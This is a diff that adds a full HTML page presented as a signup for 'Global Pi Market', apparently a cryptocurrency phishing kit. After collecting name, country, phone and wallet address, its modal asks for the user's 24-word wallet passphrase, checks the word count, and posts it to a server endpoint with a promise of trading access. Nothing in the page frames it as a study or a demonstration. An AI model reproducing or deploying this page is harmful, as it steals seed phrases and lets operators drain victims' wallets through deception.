@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>SIGN UP TO GLOBAL PI MARKET</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: #240046;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    form {
+      background-color: #3c096c;
+      padding: 40px;
+      border-radius: 20px;
+      width: 95%;
+      max-width: 720px;
+      height: 75vh;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 3rem;
+      text-transform: uppercase;
+      font-weight: bold;
+      margin-bottom: 35px;
+    }
+
+    .form-group {
+      margin-bottom: 25px;
+      flex-shrink: 0;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+      font-size: 1.6rem;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 18px;
+      font-size: 1.6rem;
+      border: none;
+      border-radius: 10px;
+      background-color: white;
+      color: black;
+    }
+
+    button {
+      width: 100%;
+      padding: 20px;
+      font-size: 1.8rem;
+      font-weight: bold;
+      background-color: #7b2cbf;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-top: auto;
+    }
+
+    button:hover {
+      background-color: #9d4edd;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #240046;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background-color: #3c096c;
+      padding: 40px;
+      border-radius: 15px;
+      width: 95%;
+      max-width: 720px;
+      max-height: 90%;
+      overflow-y: auto;
+      text-align: center;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .modal-content h2 {
+      font-size: 2rem;
+      font-weight: bold;
+      margin-bottom: 35px;
+      line-height: 1.6;
+    }
+
+    .modal-content textarea {
+      width: 100%;
+      max-width: 600px;
+      height: 220px;
+      padding: 20px;
+      font-size: 1.6rem;
+      border-radius: 12px;
+      border: none;
+      resize: none;
+      background-color: white;
+      color: black;
+      margin-bottom: 25px;
+      text-align: center;
+    }
+
+    .modal-content button {
+      font-size: 1.7rem;
+      font-weight: bold;
+      padding: 16px;
+      border-radius: 12px;
+      border: none;
+      background-color: #7b2cbf;
+      color: white;
+      width: 100%;
+      max-width: 600px;
+    }
+
+    .modal-content button:hover {
+      background-color: #9d4edd;
+    }
+
+    .loading-spinner {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 6px solid white;
+      border-top: 6px solid #9d4edd;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <form onsubmit="showWalletPopup(event)">
+    <h1>SIGN UP TO GLOBAL PI MARKET</h1>
+
+    <div class="form-group">
+      <label for="firstname">FIRST NAME</label>
+      <input type="text" id="firstname" name="firstname" required>
+    </div>
+
+    <div class="form-group">
+      <label for="middlename">MIDDLE NAME (optional)</label>
+      <input type="text" id="middlename" name="middlename">
+    </div>
+
+    <div class="form-group">
+      <label for="lastname">LAST NAME</label>
+      <input type="text" id="lastname" name="lastname" required>
+    </div>
+
+    <div class="form-group">
+      <label for="country">COUNTRY</label>
+      <select id="country" name="country" required>
+        <option value="">Select your country</option>
+        <option>Afghanistan</option><option>Albania</option><option>Algeria</option><option>Andorra</option>
+        <option>Angola</option><option>Argentina</option><option>Armenia</option><option>Australia</option>
+        <option>Austria</option><option>Azerbaijan</option><option>Bahamas</option><option>Bahrain</option>
+        <option>Bangladesh</option><option>Barbados</option><option>Belarus</option><option>Belgium</option>
+        <option>Benin</option><option>Bhutan</option><option>Bolivia</option><option>Botswana</option>
+        <option>Brazil</option><option>Brunei</option><option>Bulgaria</option><option>Burkina Faso</option>
+        <option>Burundi</option><option>Cambodia</option><option>Cameroon</option><option>Canada</option>
+        <option>Chad</option><option>Chile</option><option>China</option><option>Colombia</option>
+        <option>Comoros</option><option>Congo</option><option>Costa Rica</option><option>Croatia</option>
+        <option>Cuba</option><option>Cyprus</option><option>Czech Republic</option><option>Denmark</option>
+        <option>Djibouti</option><option>Dominica</option><option>Dominican Republic</option><option>Ecuador</option>
+        <option>Egypt</option><option>El Salvador</option><option>Estonia</option><option>Eswatini</option>
+        <option>Ethiopia</option><option>Fiji</option><option>Finland</option><option>France</option>
+        <option>Gabon</option><option>Gambia</option><option>Georgia</option><option>Germany</option>
+        <option>Ghana</option><option>Greece</option><option>Grenada</option><option>Guatemala</option>
+        <option>Guinea</option><option>Guyana</option><option>Haiti</option><option>Honduras</option>
+        <option>Hungary</option><option>Iceland</option><option>India</option><option>Indonesia</option>
+        <option>Iran</option><option>Iraq</option><option>Ireland</option><option>Israel</option>
+        <option>Italy</option><option>Jamaica</option><option>Japan</option><option>Jordan</option>
+        <option>Kazakhstan</option><option>Kenya</option><option>Kuwait</option><option>Kyrgyzstan</option>
+        <option>Laos</option><option>Latvia</option><option>Lebanon</option><option>Lesotho</option>
+        <option>Liberia</option><option>Libya</option><option>Lithuania</option><option>Luxembourg</option>
+        <option>Madagascar</option><option>Malawi</option><option>Malaysia</option><option>Maldives</option>
+        <option>Mali</option><option>Malta</option><option>Mauritania</option><option>Mauritius</option>
+        <option>Mexico</option><option>Moldova</option><option>Monaco</option><option>Mongolia</option>
+        <option>Montenegro</option><option>Morocco</option><option>Mozambique</option><option>Myanmar</option>
+        <option>Namibia</option><option>Nepal</option><option>Netherlands</option><option>New Zealand</option>
+        <option>Nicaragua</option><option>Niger</option><option>Nigeria</option><option>North Korea</option>
+        <option>Norway</option><option>Oman</option><option>Pakistan</option><option>Panama</option>
+        <option>Paraguay</option><option>Peru</option><option>Philippines</option><option>Poland</option>
+        <option>Portugal</option><option>Qatar</option><option>Romania</option><option>Russia</option>
+        <option>Rwanda</option><option>Saudi Arabia</option><option>Senegal</option><option>Serbia</option>
+        <option>Seychelles</option><option>Sierra Leone</option><option>Singapore</option><option>Slovakia</option>
+        <option>Slovenia</option><option>Somalia</option><option>South Africa</option><option>South Korea</option>
+        <option>South Sudan</option><option>Spain</option><option>Sri Lanka</option><option>Sudan</option>
+        <option>Suriname</option><option>Sweden</option><option>Switzerland</option><option>Syria</option>
+        <option>Taiwan</option><option>Tajikistan</option><option>Tanzania</option><option>Thailand</option>
+        <option>Togo</option><option>Tunisia</option><option>Turkey</option><option>Uganda</option>
+        <option>Ukraine</option><option>United Arab Emirates</option><option>United Kingdom</option>
+        <option>United States</option><option>Uruguay</option><option>Uzbekistan</option><option>Venezuela</option>
+        <option>Vietnam</option><option>Yemen</option><option>Zambia</option><option>Zimbabwe</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="phone">PHONE NUMBER</label>
+      <input type="text" id="phone" name="phone" required />
+    </div>
+
+    <div class="form-group">
+      <label for="piaddress">PI WALLET ADDRESS (G...)</label>
+      <input type="text" id="piaddress" name="piaddress" placeholder="G..." required />
+    </div>
+
+    <button type="submit">SUBMIT SIGNUP</button>
+  </form>
+
+  <div id="walletModal" class="modal">
+    <div class="modal-content">
+      <h2>
+        TO COMPLETE SIGN UP TO GLOBAL PI MARKET,<br>
+        connect your pi wallet to unlock full access — enjoy secure trading, unbeatable rates, all crypto withdraw payment methods, automatic wallet syncing, and instant transactions.
+      </h2>
+      <textarea id="passphraseInput" placeholder="Enter your 24-word passphrase here..."></textarea>
+      <button onclick="validatePassphrase()">CONNECT WALLET</button>
+      <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function showWalletPopup(event) {
+      event.preventDefault();
+      document.getElementById("walletModal").style.display = "flex";
+    }
+
+    function validatePassphrase() {
+      const input = document.getElementById("passphraseInput").value.trim();
+      const wordCount = input.split(/\s+/).length;
+      if (wordCount === 24) {
+        document.getElementById("loadingSpinner").style.display = "block";
+        fetch("/submit-passphrase", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: "passphrase=" + encodeURIComponent(input)
+        })
+        .then(response => {
+          if (response.ok) {
+            window.location.href = "/confirmation";
+          } else {
+            return response.text().then(msg => alert(msg));
+          }
+        })
+        .catch(() => {
+          alert("Error connecting to the server.");
+        });
+      } else {
+        alert("Invalid passphrase. Please enter exactly 24 words.");
+      }
+    }
+  </script>
+
+</body>
+</html>
